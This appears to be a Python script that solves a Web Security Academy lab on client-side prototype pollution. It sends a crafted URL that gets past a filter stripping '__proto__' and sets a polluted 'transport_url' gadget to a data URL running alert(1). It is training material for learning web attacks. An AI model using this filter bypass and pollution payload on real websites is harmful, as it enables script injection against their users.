from web_security_academy.core.logger import logger

# Source:   `window.location`
# Sink:     `deparam` function defined in `/resources/js/deparamSanitised.js`
# Gadget:   `transport_url` property of `config` variable defined in
#           `/resources/js/searchLoggerFiltered.js`


def solve_lab(session):
    # "__pro__proto__to__".replaceAll("__proto__", "") === "__proto__"
    path = "/?__pro__proto__to__[transport_url]=data:text/javascript,alert(1)"
    logger.info(f"Visiting `{path}`...")
    session.get_path(path)
